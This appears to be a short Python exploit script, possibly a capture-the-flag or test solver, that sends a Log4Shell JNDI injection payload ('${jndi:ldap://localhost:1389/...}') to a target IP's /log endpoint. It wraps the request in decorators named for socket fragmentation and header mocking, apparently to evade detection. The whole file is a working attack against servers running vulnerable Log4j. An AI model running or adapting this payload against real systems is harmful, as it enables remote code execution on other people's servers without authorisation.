from mnm import *
import requests

@mixed(SocketFragmentation(slice=5), HeaderMocking())
def solve(ip):
    r = requests.get(f'http://{ip}/log', data={
        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
    })
    print(r.text)

def test(ip):
    solve(ip)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <ip>")
        exit(1)
    
    test(sys.argv[1])